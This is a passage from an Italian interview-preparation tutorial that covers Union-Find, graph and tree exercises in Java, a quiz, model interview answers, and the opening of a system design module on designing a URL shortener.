                <p><strong>Union-Find</strong> (o Disjoint Set Union, DSU) è una struttura dati che gestisce una collezione di insiemi disgiunti. Supporta due operazioni principali: <strong>find</strong> (a quale insieme appartiene un elemento?) e <strong>union</strong> (unisci due insiemi). È fondamentale per <strong>Kruskal's MST</strong>, <strong>connected components</strong>, e problemi di <strong>equivalence classes</strong>.</p>

                <div class="diagram">
                    <pre>
   Union-Find - Evoluzione degli insiemi:

   Stato iniziale: {0} {1} {2} {3} {4} {5}

   union(0, 1):    {0, 1} {2} {3} {4} {5}
   union(2, 3):    {0, 1} {2, 3} {4} {5}
   union(0, 2):    {0, 1, 2, 3} {4} {5}
   union(4, 5):    {0, 1, 2, 3} {4, 5}

   find(1) == find(3)?  → Sì (stesso insieme)
   find(1) == find(4)?  → No (insiemi diversi)

   Rappresentazione ad albero (con path compression):

   Senza compression:     Con path compression (dopo find):
        0                      0
       / \                   / | \ \
      1   2                 1  2  3  (tutti puntano alla root)
          |
          3
                    </pre>
                </div>

                <pre><code class="language-java">// Union-Find con Path Compression e Union by Rank
class UnionFind {
    private int[] parent;
    private int[] rank;
    private int components; // numero di componenti connesse

    public UnionFind(int n) {
        parent = new int[n];
        rank = new int[n];
        components = n;
        for (int i = 0; i < n; i++) {
            parent[i] = i; // ogni elemento è il proprio parent
            rank[i] = 0;
        }
    }

    // Find con Path Compression: O(α(n)) ammortizzato ≈ O(1)
    // Appiattisce l'albero durante la ricerca
    public int find(int x) {
        if (parent[x] != x) {
            parent[x] = find(parent[x]); // path compression
        }
        return parent[x];
    }

    // Union by Rank: O(α(n)) ammortizzato ≈ O(1)
    // Attacca l'albero più basso sotto quello più alto
    public boolean union(int x, int y) {
        int rootX = find(x);
        int rootY = find(y);

        if (rootX == rootY) return false; // già nello stesso insieme

        // Union by rank: l'albero più basso va sotto quello più alto
        if (rank[rootX] < rank[rootY]) {
            parent[rootX] = rootY;
        } else if (rank[rootX] > rank[rootY]) {
            parent[rootY] = rootX;
        } else {
            parent[rootY] = rootX;
            rank[rootX]++;
        }

        components--;
        return true;
    }

    public boolean connected(int x, int y) {
        return find(x) == find(y);
    }

    public int getComponents() {
        return components;
    }
}

// Esempio: Numero di componenti connesse in un grafo
public int countConnectedComponents(int n, int[][] edges) {
    UnionFind uf = new UnionFind(n);
    for (int[] edge : edges) {
        uf.union(edge[0], edge[1]);
    }
    return uf.getComponents();
}

// Esempio: Cycle detection in grafo non diretto
public boolean hasCycleUndirected(int n, int[][] edges) {
    UnionFind uf = new UnionFind(n);
    for (int[] edge : edges) {
        // Se due nodi sono già connessi e aggiungiamo un arco → ciclo
        if (!uf.union(edge[0], edge[1])) {
            return true;
        }
    }
    return false;
}

// Esempio: Kruskal's Minimum Spanning Tree
public int kruskalMST(int n, int[][] edges) {
    // edges[i] = [u, v, weight]
    Arrays.sort(edges, Comparator.comparingInt(e -> e[2])); // ordina per peso

    UnionFind uf = new UnionFind(n);
    int totalWeight = 0;
    int edgesUsed = 0;

    for (int[] edge : edges) {
        if (uf.union(edge[0], edge[1])) {
            totalWeight += edge[2];
            edgesUsed++;
            if (edgesUsed == n - 1) break; // MST ha n-1 archi
        }
    }
    return edgesUsed == n - 1 ? totalWeight : -1; // -1 se grafo disconnesso
}</code></pre>

                <div class="info-box success">
                    <strong>Pattern nelle interview:</strong> Union-Find compare in problemi di:
                    <br>• <strong>Connected Components</strong>: "Quante isole ci sono?" / "Quanti gruppi?"
                    <br>• <strong>Cycle Detection</strong>: in grafi non diretti
                    <br>• <strong>MST</strong>: Kruskal's algorithm
                    <br>• <strong>Equivalence</strong>: "Account merge", "Sentence similarity"
                    <br>Se il problema chiede di raggruppare o connettere elementi, pensa a Union-Find.
                </div>
            </section>

            <!-- Exercises Section -->
            <section class="section" id="modulo12-exercises">
                <h2>Esercizi Pratici</h2>

                <h3>Esercizio 1: Validate Binary Search Tree</h3>
                <p>Dato un albero binario, verifica se è un BST valido.</p>

                <pre><code class="language-java">// Approccio: range valido per ogni nodo
// Ogni nodo deve essere nel range (min, max) definito dai suoi antenati
class TreeNode {
    int val;
    TreeNode left, right;
    TreeNode(int val) { this.val = val; }
}

public boolean isValidBST(TreeNode root) {
    return validate(root, Long.MIN_VALUE, Long.MAX_VALUE);
}

private boolean validate(TreeNode node, long min, long max) {
    if (node == null) return true;
    if (node.val <= min || node.val >= max) return false;

    return validate(node.left, min, node.val)      // sx: max diventa node.val
        && validate(node.right, node.val, max);     // dx: min diventa node.val
}
// Complessità: O(n) tempo, O(h) spazio (stack ricorsivo)</code></pre>

                <h3>Esercizio 2: Number of Islands (BFS/DFS su griglia)</h3>
                <p>Data una griglia 2D di '1' (terra) e '0' (acqua), conta il numero di isole. Un'isola è un gruppo di '1' connessi orizzontalmente o verticalmente.</p>

                <pre><code class="language-java">// Approccio DFS: per ogni '1' non visitato, esplora tutta l'isola
public int numIslands(char[][] grid) {
    int count = 0;
    for (int i = 0; i < grid.length; i++) {
        for (int j = 0; j < grid[0].length; j++) {
            if (grid[i][j] == '1') {
                count++;
                dfs(grid, i, j); // "affonda" tutta l'isola
            }
        }
    }
    return count;
}

private void dfs(char[][] grid, int r, int c) {
    if (r < 0 || r >= grid.length || c < 0 || c >= grid[0].length
            || grid[r][c] != '1') return;

    grid[r][c] = '0'; // marca come visitato
    dfs(grid, r + 1, c);
    dfs(grid, r - 1, c);
    dfs(grid, r, c + 1);
    dfs(grid, r, c - 1);
}
// Complessità: O(m × n) tempo, O(m × n) spazio (stack ricorsivo worst case)</code></pre>

                <h3>Esercizio 3: Course Schedule (Topological Sort)</h3>
                <p>Dati n corsi e prerequisiti, determina se è possibile completare tutti i corsi.</p>

                <pre><code class="language-java">// Approccio: se il grafo delle dipendenze ha un ciclo → impossibile
public boolean canFinish(int numCourses, int[][] prerequisites) {
    List&lt;List&lt;Integer&gt;&gt; adj = new ArrayList&lt;&gt;();
    int[] inDegree = new int[numCourses];

    for (int i = 0; i < numCourses; i++) adj.add(new ArrayList&lt;&gt;());

    for (int[] pre : prerequisites) {
        adj.get(pre[1]).add(pre[0]); // pre[1] → pre[0]
        inDegree[pre[0]]++;
    }

    // Kahn's: BFS partendo dai nodi con in-degree 0
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    for (int i = 0; i < numCourses; i++) {
        if (inDegree[i] == 0) queue.offer(i);
    }

    int completed = 0;
    while (!queue.isEmpty()) {
        int course = queue.poll();
        completed++;
        for (int next : adj.get(course)) {
            if (--inDegree[next] == 0) queue.offer(next);
        }
    }
    return completed == numCourses; // se non tutti completati → ciclo
}
// Complessità: O(V + E) tempo, O(V + E) spazio</code></pre>
            </section>

            <!-- Quiz Section Modulo 12 -->
            <section class="quiz-section" id="modulo12-quiz">
                <h2>Interactive Challenge Quiz - Modulo 12</h2>

                <!-- Question 56 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Come si cancella un nodo con due figli da un BST?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q56" id="q56a" value="a">
                            <label for="q56a">Si rimuove il nodo e si ricollegano entrambi i figli al padre</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q56" id="q56b" value="b">
                            <label for="q56b">Si ricostruisce l'intero sottoalbero con i nodi rimanenti</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q56" id="q56c" value="c">
                            <label for="q56c">Si sostituisce con il successore in-order (minimo del sottoalbero destro) e si elimina il successore</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q56" id="q56d" value="d">
                            <label for="q56d">Si sostituisce con il figlio sinistro e si scarta il sottoalbero destro</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q56')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q56"></div>
                </div>

                <!-- Question 57 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Quale algoritmo è il più appropriato per il Topological Sort?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q57" id="q57a" value="a">
                            <label for="q57a">BFS standard senza modifiche</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q57" id="q57b" value="b">
                            <label for="q57b">DFS con post-order (o Kahn's con in-degree)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q57" id="q57c" value="c">
                            <label for="q57c">Dijkstra con pesi unitari</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q57" id="q57d" value="d">
                            <label for="q57d">Ordinamento dei nodi per peso degli archi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q57')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q57"></div>
                </div>

                <!-- Question 58 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Come funziona l'inserimento in un Min-Heap?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q58" id="q58a" value="a">
                            <label for="q58a">Inserisci alla fine dell'array e fai bubble-up confrontando con il padre</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q58" id="q58b" value="b">
                            <label for="q58b">Inserisci nella posizione corretta mantenendo l'array ordinato</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q58" id="q58c" value="c">
                            <label for="q58c">Inserisci come in un BST: sinistro se minore, destro se maggiore</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q58" id="q58d" value="d">
                            <label for="q58d">Ricostruisci l'intero heap da zero includendo il nuovo elemento, con costo O(n log n)</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q58')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q58"></div>
                </div>

                <!-- Question 59 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Qual è la complessità ammortizzata di Union-Find con path compression e union by rank?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q59" id="q59a" value="a">
                            <label for="q59a">O(1) esatto per operazione</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q59" id="q59b" value="b">
                            <label for="q59b">O(log n) per operazione</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q59" id="q59c" value="c">
                            <label for="q59c">O(n) per operazione</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q59" id="q59d" value="d">
                            <label for="q59d">O(&#945;(n)) per operazione, dove &#945; è la funzione inversa di Ackermann</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q59')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q59"></div>
                </div>

                <!-- Question 60 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Per un autocomplete system con milioni di parole, qual è la struttura dati più efficiente per la ricerca per prefisso?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q60" id="q60a" value="a">
                            <label for="q60a">HashMap con tutte le parole come chiavi</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q60" id="q60b" value="b">
                            <label for="q60b">Trie (Prefix Tree)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q60" id="q60c" value="c">
                            <label for="q60c">Binary Search Tree con le parole ordinate</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q60" id="q60d" value="d">
                            <label for="q60d">Array ordinato con binary search</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q60')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q60"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 12 -->
            <section class="section" id="modulo12-questions">
                <h2>Domande da Colloquio - Modulo 12</h2>

                <div class="info-box">
                    <h4>Q: Quando sceglieresti un BST (TreeMap) rispetto a una HashMap?</h4>
                    <p><strong>Risposta attesa:</strong> TreeMap (Red-Black BST) quando serve <strong>ordinamento delle chiavi</strong>: range queries (subMap, headMap, tailMap), navigazione (firstKey, lastKey, ceilingKey, floorKey), o iterazione ordinata. HashMap è O(1) per get/put vs O(log n) di TreeMap, quindi se non serve ordine, HashMap è sempre preferibile. Caso d'uso tipico: un leaderboard dove devi trovare "tutti i giocatori con punteggio tra 100 e 200" → TreeMap. Un cache key→value → HashMap.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra BFS e DFS e quando useresti ciascuno.</h4>
                    <p><strong>Risposta attesa:</strong> BFS esplora per livelli usando una Queue, DFS esplora in profondità usando Stack/ricorsione. BFS: shortest path in grafi non pesati (ogni arco ha peso 1), level-order traversal, "nearest" problems (es: trovare la parola più vicina). DFS: cycle detection, topological sort, connected components, path existence, backtracking problems. BFS usa O(V) spazio per il livello più ampio; DFS usa O(V) per la profondità massima. Su alberi: BFS = level-order, DFS = pre/in/post-order.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come funziona Dijkstra e perché non funziona con pesi negativi?</h4>
                    <p><strong>Risposta attesa:</strong> Dijkstra usa una Priority Queue (Min-Heap). Ad ogni passo, estrae il nodo con distanza minima e "rilassa" i suoi vicini: se dist[u] + weight(u,v) < dist[v], aggiorna dist[v]. Funziona perché, con pesi non negativi, una volta che un nodo è estratto dalla PQ, la sua distanza è definitiva. Con pesi negativi, questa assunzione fallisce: un percorso più lungo con un arco negativo potrebbe essere più corto di quello già processato. Alternativa: Bellman-Ford (O(V×E)), che rilassa tutti gli archi V-1 volte.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la differenza tra Heap e BST? Quando usi quale?</h4>
                    <p><strong>Risposta attesa:</strong> Un Heap garantisce solo che il minimo/massimo è alla radice (partial ordering): estrazione del min/max in O(log n), peek in O(1). Un BST mantiene un ordinamento completo: ricerca di qualsiasi elemento in O(log n). Usa Heap quando ti interessa solo il min/max (Priority Queue, Dijkstra, top-K). Usa BST quando serve ricerca, range query, o ordinamento completo. Heap è implementato come array (cache-friendly), BST come nodi con puntatori. Build heap è O(n), build BST bilanciato è O(n log n).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come rilevi un ciclo in un grafo diretto vs non diretto?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Grafo diretto</strong>: DFS con 3 colori (white/gray/black). Se durante la visita incontri un nodo gray (in corso di visita nello stack corrente), hai un back edge → ciclo. Alternativa: topological sort con Kahn's - se non puoi processare tutti i nodi, c'è un ciclo. <strong>Grafo non diretto</strong>: DFS con visited + parent tracking: se incontri un nodo visitato che non è il padre → ciclo. Alternativa: Union-Find - se union(u,v) trova che u e v sono già nello stesso componente → ciclo. Union-Find è spesso più semplice per grafi non diretti.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega Union-Find e un caso d'uso pratico.</h4>
                    <p><strong>Risposta attesa:</strong> Union-Find gestisce insiemi disgiunti con find (trova il rappresentante dell'insieme) e union (unisci due insiemi). Con path compression e union by rank, entrambe le operazioni sono O(α(n)) ammortizzato, praticamente O(1). Caso d'uso: social network - "questi utenti sono nello stesso gruppo di amici?". Ogni amicizia è una union, ogni verifica è un find. Altro caso: Kruskal's MST - ordina gli archi per peso, aggiungi se non crea ciclo (union restituisce false se già connessi). Anche per "Number of Islands" si può usare Union-Find come alternativa a DFS.</p>
                </div>
            </section>

            <!-- Links Modulo 12 -->
            <section class="section" id="modulo12-links">
                <h2>Link di Approfondimento - Modulo 12</h2>

                <div class="info-box">
                    <h4>Data Structures Visualizzazioni</h4>
                    <p><a href="https://visualgo.net/en" target="_blank">VisuAlgo</a> - Visualizzazione interattiva</p>
                    <p><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html" target="_blank">USFCA: Data Structure Visualizations</a></p>
                </div>

                <div class="info-box">
                    <h4>Trees</h4>
                    <p><a href="https://www.baeldung.com/java-binary-tree" target="_blank">Baeldung: Binary Trees in Java</a></p>
                    <p><a href="https://leetcode.com/tag/tree/" target="_blank">LeetCode: Tree Problems</a></p>
                    <p><a href="https://leetcode.com/tag/trie/" target="_blank">LeetCode: Trie Problems</a></p>
                </div>

                <div class="info-box">
                    <h4>Graphs</h4>
                    <p><a href="https://www.baeldung.com/java-graphs" target="_blank">Baeldung: Graphs in Java</a></p>
                    <p><a href="https://leetcode.com/tag/graph/" target="_blank">LeetCode: Graph Problems</a></p>
                    <p><a href="https://cp-algorithms.com/graph/breadth-first-search.html" target="_blank">CP Algorithms: BFS/DFS</a></p>
                </div>

                <div class="info-box">
                    <h4>Heaps & Priority Queues</h4>
                    <p><a href="https://www.baeldung.com/java-heap-sort" target="_blank">Baeldung: Heap Sort</a></p>
                    <p><a href="https://leetcode.com/tag/heap-priority-queue/" target="_blank">LeetCode: Heap/Priority Queue</a></p>
                </div>

                <div class="info-box">
                    <h4>Union-Find</h4>
                    <p><a href="https://www.baeldung.com/java-union-find" target="_blank">Baeldung: Union-Find in Java</a></p>
                    <p><a href="https://leetcode.com/tag/union-find/" target="_blank">LeetCode: Union-Find Problems</a></p>
                    <p><a href="https://cp-algorithms.com/data_structures/disjoint_set_union.html" target="_blank">CP Algorithms: DSU</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 13: SYSTEM DESIGN ==================== -->
            <header class="module-header" id="modulo13">
                <span class="module-tag">Modulo 13</span>
                <h1>System Design</h1>
                <p>Come affrontare problemi di system design: dal framework metodologico agli esercizi pratici più richiesti</p>
            </header>

            <!-- Framework Section -->
            <section class="section" id="modulo13-framework">
                <h2>Framework per System Design Interview</h2>

                <p>Un problema di system design richiede un approccio strutturato. L'errore più comune è iniziare subito a disegnare componenti senza aver capito i requisiti. Segui questo framework in 6 step:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    FRAMEWORK SYSTEM DESIGN (40-45 min)                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. REQUIREMENTS (5 min)           2. ESTIMATION (5 min)                    │
│  ┌─────────────────────────┐       ┌─────────────────────────┐              │
│  │ Functional:             │       │ • DAU / MAU             │              │
│  │ • Core features         │       │ • Read/Write ratio      │              │
│  │ • User actions          │       │ • Storage needs         │              │
│  │                         │       │ • Bandwidth             │              │
│  │ Non-Functional:         │       │ • QPS (queries/sec)     │              │
│  │ • Scale (users, data)   │       │                         │              │
│  │ • Latency requirements  │       │ "Back of the envelope"  │              │
│  │ • Availability target   │       │                         │              │
│  └─────────────────────────┘       └─────────────────────────┘              │
│                                                                             │
│  3. API DESIGN (5 min)             4. DATA MODEL (5 min)                    │
│  ┌─────────────────────────┐       ┌─────────────────────────┐              │
│  │ POST /api/v1/resource   │       │ • Entity relationships  │              │
│  │ GET  /api/v1/resource   │       │ • SQL vs NoSQL choice   │              │
│  │                         │       │ • Indexing strategy     │              │
│  │ • Request/Response      │       │ • Sharding key          │              │
│  │ • Error handling        │       │                         │              │
│  └─────────────────────────┘       └─────────────────────────┘              │
│                                                                             │
│  5. HIGH-LEVEL DESIGN (10 min)     6. DEEP DIVE (15 min)                    │
│  ┌─────────────────────────┐       ┌─────────────────────────┐              │
│  │ • Core components       │       │ • Bottleneck analysis   │              │
│  │ • Data flow             │       │ • Scaling strategies    │              │
│  │ • Major interactions    │       │ • Trade-offs            │              │
│  │                         │       │ • Failure handling      │              │
│  └─────────────────────────┘       └─────────────────────────┘              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Step 1: Raccolta Requisiti</h3>
                <p>Mai assumere. Fai domande per chiarire lo scope:</p>

                <div class="info-box">
                    <h4>Requisiti Funzionali (cosa fa il sistema)</h4>
                    <ul>
                        <li>Chi sono gli utenti? (B2C, B2B, interni)</li>
                        <li>Quali sono le operazioni principali?</li>
                        <li>Quali features sono MVP vs nice-to-have?</li>
                        <li>Ci sono requisiti di real-time?</li>
                    </ul>
                </div>

                <div class="info-box warning">
                    <h4>Requisiti Non-Funzionali (come performa)</h4>
                    <ul>
                        <li><strong>Scale:</strong> Quanti utenti? Quanti dati?</li>
                        <li><strong>Availability:</strong> 99.9% (8.7h downtime/anno) vs 99.99% (52min/anno)?</li>
                        <li><strong>Latency:</strong> p99 < 200ms? Real-time?</li>
                        <li><strong>Consistency:</strong> Strong vs eventual?</li>
                        <li><strong>Durability:</strong> Zero data loss?</li>
                    </ul>
                </div>

                <h3>Step 2: Back-of-the-Envelope Estimation</h3>
                <p>Calcoli rapidi per dimensionare il sistema. Usa numeri tondi e approssimazioni:</p>

                <pre><code class="language-java">// Numeri utili da memorizzare
2^10 = 1 KB (Kilobyte)     = 1,000
2^20 = 1 MB (Megabyte)     = 1,000,000
2^30 = 1 GB (Gigabyte)     = 1,000,000,000
2^40 = 1 TB (Terabyte)     = 1,000,000,000,000

1 day  = 86,400 sec  ≈ 100,000 sec (10^5)
1 year = 365 days    ≈ 400 days

// Esempio: Twitter-like system
// 500M DAU, ogni utente fa 2 tweet/day, ogni tweet 140 chars + metadata ≈ 1 KB

// Write QPS
Tweets/day = 500M * 2 = 1B tweets/day
Write QPS  = 1B / 100,000 sec = 10,000 QPS
Peak QPS   = 10,000 * 3 = 30,000 QPS (assume 3x peak)

// Storage (5 anni)
Storage/day  = 1B * 1 KB = 1 TB/day
Storage/year = 1 TB * 365 = 365 TB/year
5 years      = 365 TB * 5 ≈ 2 PB (senza replication)

// Read QPS (assume 100:1 read:write ratio)
Read QPS = 10,000 * 100 = 1,000,000 QPS (read-heavy!)</code></pre>

                <h3>Step 3: API Design</h3>
                <p>Definisci le API principali. REST è lo standard, ma considera gRPC per comunicazione interna:</p>

                <pre><code class="language-java">// URL Shortener APIs
POST /api/v1/urls
Request:  { "long_url": "https://example.com/very/long/path" }
Response: { "short_url": "https://short.ly/abc123", "expires_at": "2025-01-01" }

GET /api/v1/urls/{short_code}
Response: 301 Redirect to long_url

// Rate limiting headers
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1640000000</code></pre>

                <h3>Step 4: Data Model & Database Choice</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────┐
│                     SQL vs NoSQL Decision Tree                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Hai bisogno di ACID transactions?  ──YES──►  SQL (PostgreSQL)      │
│         │                                                           │
│         NO                                                          │
│         ▼                                                           │
│  Schema è flessibile/gerarchico?  ──YES──►  Document DB (MongoDB)   │
│         │                                                           │
│         NO                                                          │
│         ▼                                                           │
│  Dati sono relazioni many-to-many?  ──YES──►  Graph DB (Neo4j)      │
│         │                                                           │
│         NO                                                          │
│         ▼                                                           │
│  Accesso key-value semplice?  ──YES──►  Key-Value (Redis, DynamoDB) │
│         │                                                           │
│         NO                                                          │
│         ▼                                                           │
│  Time-series data?  ──YES──►  Time-series DB (InfluxDB, TimescaleDB)│
│         │                                                           │
│         NO                                                          │
│         ▼                                                           │
│  Full-text search?  ──YES──►  Search Engine (Elasticsearch)         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Step 5: High-Level Design</h3>
                <p>Disegna i componenti principali e il flusso di dati. Non entrare nei dettagli, mostra la visione d'insieme:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        Tipico High-Level Design                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────┐     ┌─────────────┐     ┌─────────────────────────────────┐   │
│   │ Clients │────►│ Load Balancer│────►│        API Gateway              │   │
│   └─────────┘     └─────────────┘     │  • Rate Limiting                │   │
│                                       │  • Authentication               │   │
│                                       │  • Request Routing              │   │
│                                       └───────────────┬─────────────────┘   │
│                                                       │                     │
│                          ┌────────────────────────────┼──────────────────┐  │
│                          │                            │                  │  │
│                          ▼                            ▼                  ▼  │
│                   ┌─────────────┐            ┌─────────────┐     ┌─────────┐│
│                   │ Service A   │            │ Service B   │     │Service C││
│                   │ (Write-heavy)│            │ (Read-heavy)│     │(Async)  ││
│                   └──────┬──────┘            └──────┬──────┘     └────┬────┘│
│                          │                          │                 │     │
│                          ▼                          ▼                 ▼     │
│                   ┌─────────────┐            ┌─────────────┐   ┌───────────┐│
│                   │  Primary DB │            │    Cache    │   │   Queue   ││
│                   │  (Write)    │───────────►│   (Redis)   │   │  (Kafka)  ││
│                   └──────┬──────┘            └─────────────┘   └───────────┘│
│                          │                                                  │
│                          ▼                                                  │
│                   ┌─────────────┐                                           │
│                   │ Read Replicas│                                          │
│                   └─────────────┘                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Step 6: Deep Dive</h3>
                <p>L'intervistatore sceglierà 1-2 aree su cui approfondire. Preparati a discutere:</p>

                <ul>
                    <li><strong>Scaling:</strong> Come gestisci 10x il traffico? Horizontal vs Vertical scaling</li>
                    <li><strong>Single Point of Failure:</strong> Cosa succede se X muore? Redundancy strategy</li>
                    <li><strong>Data consistency:</strong> Come garantisci consistenza in un sistema distribuito?</li>
                    <li><strong>Caching strategy:</strong> Cache-aside, Write-through, Write-behind</li>
                    <li><strong>Monitoring:</strong> Come identifichi problemi? Metrics, logs, alerts</li>
                </ul>
            </section>

            <!-- URL Shortener Section -->
            <section class="section" id="modulo13-urlshortener">
                <h2>Esercizio: URL Shortener</h2>

                <p>Progetta un servizio come bit.ly o TinyURL. Questo è un classico "read-heavy" system con requisiti di unicità e bassa latenza.</p>

                <h3>Requirements</h3>
                <div class="info-box">
                    <h4>Funzionali</h4>
                    <ul>
                        <li>Dato un URL lungo, genera un URL corto</li>
                        <li>Dato un URL corto, redirect all'URL originale</li>
                        <li>URL corti devono essere unici</li>
                        <li>Opzionale: custom alias, expiration, analytics</li>
                    </ul>
                    <h4>Non-Funzionali</h4>
                    <ul>
                        <li>High availability (il redirect deve sempre funzionare)</li>
                        <li>Low latency redirect (< 100ms)</li>
                        <li>Scale: 100M URLs create/day, 10B redirects/day</li>
                    </ul>
                </div>

                <h3>Estimation</h3>
                <pre><code class="language-java">// Scale
Write: 100M URLs/day = 100M / 86400 ≈ 1200 URLs/sec
Read:  10B redirects/day = 10B / 86400 ≈ 115,000 redirects/sec
Ratio: 100:1 read:write (read-heavy!)

// Storage (10 anni)
Ogni URL entry ≈ 500 bytes (short_code + long_url + metadata)
10 anni = 100M * 365 * 10 = 365 Billion URLs
Storage = 365B * 500 bytes = 182.5 TB

// Short code length
Base62 (a-z, A-Z, 0-9) = 62 caratteri
6 chars = 62^6 = 56.8 Billion combinazioni (sufficiente per 10+ anni)
7 chars = 62^7 = 3.5 Trillion combinazioni</code></pre>

                <h3>API Design</h3>
                <pre><code class="language-java">// Create short URL
POST /api/v1/shorten
Request:  { "long_url": "https://...", "custom_alias": "my-link", "expires_at": "..." }
Response: { "short_url": "https://short.ly/abc123" }

// Redirect (questo è il path critico!)
GET /{short_code}
Response: HTTP 301 (permanent) or 302 (temporary) Redirect
Location: https://original-long-url.com/path</code></pre>

                <h3>Data Model</h3>
                <pre><code class="language-java">// SQL Schema
CREATE TABLE urls (
    id           BIGINT PRIMARY KEY AUTO_INCREMENT,
    short_code   VARCHAR(7) UNIQUE NOT NULL,
    long_url     VARCHAR(2048) NOT NULL,
    user_id      BIGINT,
    created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at   TIMESTAMP,
    click_count  BIGINT DEFAULT 0,

    INDEX idx_short_code (short_code),  -- lookup primario
    INDEX idx_user_id (user_id)          -- per user dashboard
);

// Perché SQL?
// - Schema semplice e fisso
// - ACID per unicità short_code
// - Relazioni (user → urls)</code></pre>

                <h3>Short Code Generation</h3>
                <p>Due approcci principali:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│              Approccio 1: Hash + Collision Resolution                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  long_url ──► MD5/SHA256 ──► Take first 6-7 chars ──► Check if exists      │
│                                                              │              │
│                              ┌────────────────◄──────────────┘              │
│                              │                                              │
│                    EXISTS?  YES ──► Append counter/rehash ──► Check again   │
│                              │                                              │
│                              NO ──► Save to DB                              │
│                                                                             │
│  Pro: Deterministic (same URL → same short code)                            │
│  Con: Collision handling adds complexity                                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│              Approccio 2: Pre-generated Key Service (KGS)                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌───────────────┐         ┌───────────────┐         ┌──────────────────┐   │
│  │  Key Generator │────────►│   Key DB      │────────►│  App Servers     │   │
│  │  (Offline)     │         │  (unused keys)│         │  (fetch batch)   │   │
│  └───────────────┘         └───────────────┘         └──────────────────┘   │
│                                                                             │
│  1. KGS pre-genera milioni di short codes unici                            │
│  2. App servers prendono batch di keys (es: 1000)                          │
│  3. Mark as "used" atomicamente                                            │
│                                                                             │
│  Pro: No collision, velocissimo (no hash computation)                       │
│  Con: Extra service to maintain, keys pre-allocated                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Base62 encoding (approccio con counter/ID)
public class Base62Encoder {
    private static final String ALPHABET =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    public static String encode(long num) {
        StringBuilder sb = new StringBuilder();
        while (num > 0) {
            sb.append(ALPHABET.charAt((int)(num % 62)));
            num /= 62;
        }
        return sb.reverse().toString();
    }

    public static long decode(String str) {
        long num = 0;
        for (char c : str.toCharArray()) {
